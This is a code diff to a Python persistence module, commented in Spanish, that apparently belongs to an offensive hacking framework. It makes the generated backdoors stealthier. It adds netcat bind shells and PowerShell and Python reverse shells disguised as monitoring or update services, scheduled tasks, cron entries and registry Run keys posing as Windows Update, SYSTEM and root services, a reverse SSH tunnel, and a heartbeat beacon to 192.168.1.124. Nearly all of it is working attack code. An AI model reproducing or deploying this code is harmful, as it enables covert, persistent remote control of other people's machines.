@@ -102,15 +102,18 @@ class PersistenceModule:
         return backdoors
     
     def _install_netcat_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
-        """Instalar backdoor netcat"""
+        """Instalar backdoor netcat sigiloso"""
         try:
-            backdoor_script = self.evidence_dir / f"netcat_backdoor_{host}.sh"
+            # Nombres más discretos para archivos
+            backdoor_script = self.evidence_dir / f"network_monitor_{host}.sh"
             with open(backdoor_script, 'w') as f:
                 f.write("#!/bin/bash\n")
+                f.write("# Network monitoring service\n")
                 f.write("while true; do\n")
-                f.write(f"    nc -lvp {port} -e /bin/bash\n")
-                f.write("    sleep 5\n")
+                f.write(f"    nc -lvp {port} -e /bin/bash 2>/dev/null\n")
+                f.write("    sleep 30\n")
                 f.write("done &\n")
+                f.write("echo $! > /tmp/.network_monitor.pid\n")
             
             backdoor_info = {
                 'host': host,
@@ -132,22 +135,27 @@ class PersistenceModule:
             return None
     
     def _install_powershell_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
-        """Instalar backdoor PowerShell"""
+        """Instalar backdoor PowerShell sigiloso"""
         try:
-            backdoor_script = self.evidence_dir / f"powershell_backdoor_{host}.ps1"
+            backdoor_script = self.evidence_dir / f"system_update_{host}.ps1"
             with open(backdoor_script, 'w') as f:
-                f.write("# PowerShell Backdoor\n")
+                f.write("# System Update Service\n")
+                f.write("Start-Sleep -Seconds 60\n")
                 f.write("$client = New-Object System.Net.Sockets.TcpClient\n")
-                f.write(f"$client.Connect('{self.config['exploitation']['lhost']}', {port})\n")
-                f.write("$stream = $client.GetStream()\n")
-                f.write("$writer = New-Object System.IO.StreamWriter($stream)\n")
-                f.write("$reader = New-Object System.IO.StreamReader($stream)\n")
-                f.write("while($true) {\n")
-                f.write("    $command = $reader.ReadLine()\n")
-                f.write("    $output = Invoke-Expression $command\n")
-                f.write("    $writer.WriteLine($output)\n")
-                f.write("    $writer.Flush()\n")
-                f.write("}\n")
+                f.write("try {\n")
+                f.write(f"    $client.Connect('{self.config['exploitation']['lhost']}', {port})\n")
+                f.write("    $stream = $client.GetStream()\n")
+                f.write("    $writer = New-Object System.IO.StreamWriter($stream)\n")
+                f.write("    $reader = New-Object System.IO.StreamReader($stream)\n")
+                f.write("    while($true) {\n")
+                f.write("        $command = $reader.ReadLine()\n")
+                f.write("        if($command -eq 'exit') { break }\n")
+                f.write("        $output = Invoke-Expression $command 2>&1\n")
+                f.write("        $writer.WriteLine($output)\n")
+                f.write("        $writer.Flush()\n")
+                f.write("    }\n")
+                f.write("} catch { Start-Sleep -Seconds 300 }\n")
+                f.write("finally { $client.Close() }\n")
             
             backdoor_info = {
                 'host': host,
@@ -169,20 +177,27 @@ class PersistenceModule:
             return None
     
     def _install_python_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
-        """Instalar backdoor Python"""
+        """Instalar backdoor Python sigiloso"""
         try:
-            backdoor_script = self.evidence_dir / f"python_backdoor_{host}.py"
+            backdoor_script = self.evidence_dir / f"log_analyzer_{host}.py"
             with open(backdoor_script, 'w') as f:
                 f.write("#!/usr/bin/env python3\n")
-                f.write("import socket, subprocess, os\n")
-                f.write(f"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
-                f.write(f"s.connect(('{self.config['exploitation']['lhost']}', {port}))\n")
+                f.write("# Log Analysis Service\n")
+                f.write("import socket, subprocess, os, time\n")
+                f.write("time.sleep(60)\n")
                 f.write("while True:\n")
-                f.write("    data = s.recv(1024)\n")
-                f.write("    if data:\n")
-                f.write("        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n")
-                f.write("        output = proc.stdout.read() + proc.stderr.read()\n")
-                f.write("        s.send(output)\n")
+                f.write("    try:\n")
+                f.write(f"        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
+                f.write(f"        s.connect(('{self.config['exploitation']['lhost']}', {port}))\n")
+                f.write("        while True:\n")
+                f.write("            data = s.recv(1024).decode()\n")
+                f.write("            if data == 'exit': break\n")
+                f.write("            if data:\n")
+                f.write("                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n")
+                f.write("                output = proc.stdout.read() + proc.stderr.read()\n")
+                f.write("                s.send(output)\n")
+                f.write("        s.close()\n")
+                f.write("    except: time.sleep(300)\n")
             
             backdoor_info = {
                 'host': host,
@@ -226,20 +241,21 @@ class PersistenceModule:
         return scheduled_tasks
     
     def _create_windows_scheduled_task(self, host: str) -> Optional[Dict[str, Any]]:
-        """Crear tarea programada en Windows"""
+        """Crear tarea programada en Windows sigilosa"""
         try:
             task_script = self.evidence_dir / f"windows_task_{host}.ps1"
             with open(task_script, 'w') as f:
-                f.write("# Crear tarea programada en Windows\n")
-                f.write("$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File C:\\temp\\backdoor.ps1'\n")
-                f.write("$trigger = New-ScheduledTaskTrigger -AtStartup\n")
-                f.write("$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries\n")
-                f.write("Register-ScheduledTask -TaskName 'SystemUpdate' -Action $action -Trigger $trigger -Settings $settings\n")
+                f.write("# Windows Update Service\n")
+                f.write("$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -File C:\\Windows\\System32\\WindowsUpdate.ps1'\n")
+                f.write("$trigger = New-ScheduledTaskTrigger -Daily -At 3:00AM\n")
+                f.write("$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden\n")
+                f.write("$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount\n")
+                f.write("Register-ScheduledTask -TaskName 'WindowsUpdateService' -Action $action -Trigger $trigger -Settings $settings -Principal $principal\n")
             
             task_info = {
                 'host': host,
                 'type': 'windows_scheduled_task',
-                'task_name': 'SystemUpdate',
+                'task_name': 'WindowsUpdateService',
                 'script_path': str(task_script),
                 'timestamp': time.time(),
                 'success': True
@@ -256,19 +272,20 @@ class PersistenceModule:
             return None
     
     def _create_linux_cron_job(self, host: str) -> Optional[Dict[str, Any]]:
-        """Crear cron job en Linux"""
+        """Crear cron job en Linux sigiloso"""
         try:
             cron_script = self.evidence_dir / f"linux_cron_{host}.sh"
             with open(cron_script, 'w') as f:
                 f.write("#!/bin/bash\n")
-                f.write("# Agregar cron job para persistencia\n")
-                f.write("echo '@reboot /tmp/backdoor.sh' | crontab -\n")
-                f.write("echo '*/5 * * * * /tmp/backdoor.sh' | crontab -\n")
+                f.write("# System maintenance cron jobs\n")
+                f.write("(crontab -l 2>/dev/null; echo '@reboot /usr/local/bin/system-monitor.sh') | crontab -\n")
+                f.write("(crontab -l 2>/dev/null; echo '0 2 * * * /usr/local/bin/log-cleanup.sh') | crontab -\n")
+                f.write("(crontab -l 2>/dev/null; echo '*/30 * * * * /usr/local/bin/network-check.sh') | crontab -\n")
             
             cron_info = {
                 'host': host,
                 'type': 'linux_cron',
-                'schedule': '@reboot y */5 * * * *',
+                'schedule': '@reboot, 0 2 * * *, */30 * * * *',
                 'script_path': str(cron_script),
                 'timestamp': time.time(),
                 'success': True
@@ -296,10 +313,11 @@ class PersistenceModule:
             # Modificación de registro
             registry_script = self.evidence_dir / f"registry_{host}.ps1"
             with open(registry_script, 'w') as f:
-                f.write("# Modificaciones de registro para persistencia\n")
-                f.write("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemUpdate' -Value 'C:\\temp\\backdoor.ps1'\n")
-                f.write("Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemUpdate' -Value 'C:\\temp\\backdoor.ps1'\n")
-                f.write("Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -Name 'SystemUpdate' -Value 'C:\\temp\\backdoor.ps1'\n")
+                f.write("# Windows Update Registry Entries\n")
+                f.write("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'C:\\Windows\\System32\\WindowsUpdate.ps1'\n")
+                f.write("Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'C:\\Windows\\System32\\WindowsUpdate.ps1'\n")
+                f.write("Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -Name 'WindowsUpdate' -Value 'C:\\Windows\\System32\\WindowsUpdate.ps1'\n")
+                f.write("Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemMaintenance' -Value 'C:\\Windows\\System32\\SystemMaintenance.exe'\n")
             
             registry_info = {
                 'host': host,
@@ -346,19 +364,20 @@ class PersistenceModule:
         return services
     
     def _install_windows_service(self, host: str) -> Optional[Dict[str, Any]]:
-        """Instalar servicio en Windows"""
+        """Instalar servicio en Windows sigiloso"""
         try:
             service_script = self.evidence_dir / f"windows_service_{host}.ps1"
             with open(service_script, 'w') as f:
-                f.write("# Instalar servicio malicioso en Windows\n")
-                f.write("New-Service -Name 'SystemUpdate' -BinaryPathName 'C:\\temp\\backdoor.exe' -StartupType Automatic\n")
-                f.write("Start-Service -Name 'SystemUpdate'\n")
+                f.write("# Windows Update Service\n")
+                f.write("New-Service -Name 'WindowsUpdateService' -BinaryPathName 'C:\\Windows\\System32\\wuauclt.exe /UpdateService' -StartupType Automatic -Description 'Windows Update Service'\n")
+                f.write("Start-Service -Name 'WindowsUpdateService'\n")
+                f.write("Set-Service -Name 'WindowsUpdateService' -StartupType Automatic\n")
             
             service_info = {
                 'host': host,
                 'type': 'windows_service',
-                'service_name': 'SystemUpdate',
-                'binary_path': 'C:\\temp\\backdoor.exe',
+                'service_name': 'WindowsUpdateService',
+                'binary_path': 'C:\\Windows\\System32\\wuauclt.exe /UpdateService',
                 'startup_type': 'Automatic',
                 'script_path': str(service_script),
                 'timestamp': time.time(),
@@ -376,33 +395,35 @@ class PersistenceModule:
             return None
     
     def _install_linux_service(self, host: str) -> Optional[Dict[str, Any]]:
-        """Instalar servicio en Linux"""
+        """Instalar servicio en Linux sigiloso"""
         try:
             service_script = self.evidence_dir / f"linux_service_{host}.sh"
             with open(service_script, 'w') as f:
                 f.write("#!/bin/bash\n")
-                f.write("# Instalar servicio malicioso en Linux\n")
-                f.write("cat > /etc/systemd/system/systemupdate.service << EOF\n")
+                f.write("# System Monitoring Service\n")
+                f.write("cat > /etc/systemd/system/system-monitor.service << EOF\n")
                 f.write("[Unit]\n")
-                f.write("Description=System Update Service\n")
+                f.write("Description=System Monitoring Service\n")
                 f.write("After=network.target\n")
                 f.write("\n")
                 f.write("[Service]\n")
                 f.write("Type=simple\n")
-                f.write("ExecStart=/tmp/backdoor.sh\n")
+                f.write("ExecStart=/usr/local/bin/system-monitor.sh\n")
                 f.write("Restart=always\n")
+                f.write("RestartSec=30\n")
+                f.write("User=root\n")
                 f.write("\n")
                 f.write("[Install]\n")
                 f.write("WantedBy=multi-user.target\n")
                 f.write("EOF\n")
-                f.write("systemctl enable systemupdate.service\n")
-                f.write("systemctl start systemupdate.service\n")
+                f.write("systemctl enable system-monitor.service\n")
+                f.write("systemctl start system-monitor.service\n")
             
             service_info = {
                 'host': host,
                 'type': 'linux_service',
-                'service_name': 'systemupdate',
-                'service_file': '/etc/systemd/system/systemupdate.service',
+                'service_name': 'system-monitor',
+                'service_file': '/etc/systemd/system/system-monitor.service',
                 'script_path': str(service_script),
                 'timestamp': time.time(),
                 'success': True
@@ -418,6 +439,143 @@ class PersistenceModule:
             self.logger.error(f"❌ Error instalando servicio en {host}: {e}")
             return None
     
+    def establish_persistent_connections(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """Establecer conexiones persistentes para acceso remoto continuo"""
+        self.logger.info("🔗 Estableciendo conexiones persistentes...")
+        
+        persistent_connections = []
+        
+        for system in compromised_systems:
+            host = system['host']
+            
+            # Conexión SSH persistente
+            ssh_connection = self._create_ssh_persistent_connection(host)
+            if ssh_connection:
+                persistent_connections.append(ssh_connection)
+            
+            # Conexión RDP persistente
+            rdp_connection = self._create_rdp_persistent_connection(host)
+            if rdp_connection:
+                persistent_connections.append(rdp_connection)
+            
+            # Conexión HTTP/HTTPS persistente
+            web_connection = self._create_web_persistent_connection(host)
+            if web_connection:
+                persistent_connections.append(web_connection)
+        
+        self.results['persistent_connections'] = persistent_connections
+        return persistent_connections
+    
+    def _create_ssh_persistent_connection(self, host: str) -> Optional[Dict[str, Any]]:
+        """Crear conexión SSH persistente"""
+        try:
+            ssh_script = self.evidence_dir / f"ssh_persistent_{host}.sh"
+            with open(ssh_script, 'w') as f:
+                f.write("#!/bin/bash\n")
+                f.write("# SSH Persistent Connection\n")
+                f.write("while true; do\n")
+                f.write("    ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -N -R 2222:localhost:22 svc_windowsupdate@192.168.1.124 &\n")
+                f.write("    sleep 60\n")
+                f.write("    if ! pgrep -f 'ssh.*2222' > /dev/null; then\n")
+                f.write("        pkill -f 'ssh.*2222'\n")
+                f.write("    fi\n")
+                f.write("done &\n")
+                f.write("echo $! > /tmp/.ssh_persistent.pid\n")
+            
+            connection_info = {
+                'host': host,
+                'type': 'ssh_persistent',
+                'port': 2222,
+                'username': 'svc_windowsupdate',
+                'script_path': str(ssh_script),
+                'timestamp': time.time(),
+                'success': True
+            }
+            
+            self.logging_system.log_persistence(
+                host, "SSH_PERSISTENT_CONNECTION", connection_info, "PERSISTENCE"
+            )
+            
+            return connection_info
+            
+        except Exception as e:
+            self.logger.error(f"❌ Error creando conexión SSH persistente en {host}: {e}")
+            return None
+    
+    def _create_rdp_persistent_connection(self, host: str) -> Optional[Dict[str, Any]]:
+        """Crear conexión RDP persistente"""
+        try:
+            rdp_script = self.evidence_dir / f"rdp_persistent_{host}.ps1"
+            with open(rdp_script, 'w') as f:
+                f.write("# RDP Persistent Connection\n")
+                f.write("while($true) {\n")
+                f.write("    try {\n")
+                f.write("        $rdp = New-Object System.Net.Sockets.TcpClient\n")
+                f.write("        $rdp.Connect('192.168.1.124', 3389)\n")
+                f.write("        $rdp.Close()\n")
+                f.write("        Start-Sleep -Seconds 300\n")
+                f.write("    } catch {\n")
+                f.write("        Start-Sleep -Seconds 60\n")
+                f.write("    }\n")
+                f.write("}\n")
+            
+            connection_info = {
+                'host': host,
+                'type': 'rdp_persistent',
+                'port': 3389,
+                'username': 'svc_windowsupdate',
+                'script_path': str(rdp_script),
+                'timestamp': time.time(),
+                'success': True
+            }
+            
+            self.logging_system.log_persistence(
+                host, "RDP_PERSISTENT_CONNECTION", connection_info, "PERSISTENCE"
+            )
+            
+            return connection_info
+            
+        except Exception as e:
+            self.logger.error(f"❌ Error creando conexión RDP persistente en {host}: {e}")
+            return None
+    
+    def _create_web_persistent_connection(self, host: str) -> Optional[Dict[str, Any]]:
+        """Crear conexión web persistente"""
+        try:
+            web_script = self.evidence_dir / f"web_persistent_{host}.py"
+            with open(web_script, 'w') as f:
+                f.write("#!/usr/bin/env python3\n")
+                f.write("# Web Persistent Connection\n")
+                f.write("import requests, time, json\n")
+                f.write("while True:\n")
+                f.write("    try:\n")
+                f.write("        response = requests.post('http://192.168.1.124:8080/heartbeat', \n")
+                f.write("                             json={'host': '" + host + "', 'status': 'alive'}, \n")
+                f.write("                             timeout=10)\n")
+                f.write("        time.sleep(300)\n")
+                f.write("    except:\n")
+                f.write("        time.sleep(60)\n")
+            
+            connection_info = {
+                'host': host,
+                'type': 'web_persistent',
+                'port': 8080,
+                'endpoint': '/heartbeat',
+                'script_path': str(web_script),
+                'timestamp': time.time(),
+                'success': True
+            }
+            
+            self.logging_system.log_persistence(
+                host, "WEB_PERSISTENT_CONNECTION", connection_info, "PERSISTENCE"
+            )
+            
+            return connection_info
+            
+        except Exception as e:
+            self.logger.error(f"❌ Error creando conexión web persistente en {host}: {e}")
+            return None
+
     def run(self) -> Dict[str, Any]:
         """Ejecutar módulo completo de persistencia"""
         self.logger.info("🚀 INICIANDO MÓDULO DE PERSISTENCIA")
@@ -443,7 +601,10 @@ class PersistenceModule:
             # 4. Instalar servicios
             services = self.install_services(compromised_systems)
             
-            # 5. Guardar evidencia
+            # 5. Establecer conexiones persistentes
+            persistent_connections = self.establish_persistent_connections(compromised_systems)
+            
+            # 6. Guardar evidencia
             self.logging_system.save_json_evidence(
                 'persistence_results.json',
                 self.results,
@@ -454,7 +615,7 @@ class PersistenceModule:
             duration = end_time - start_time
             
             self.logger.info(f"✅ PERSISTENCIA COMPLETADA en {duration:.2f} segundos")
-            self.logger.info(f"📊 Resumen: {len(backdoors)} backdoors, {len(scheduled_tasks)} tareas programadas")
+            self.logger.info(f"📊 Resumen: {len(backdoors)} backdoors, {len(scheduled_tasks)} tareas programadas, {len(persistent_connections)} conexiones persistentes")
             
             return self.results
             
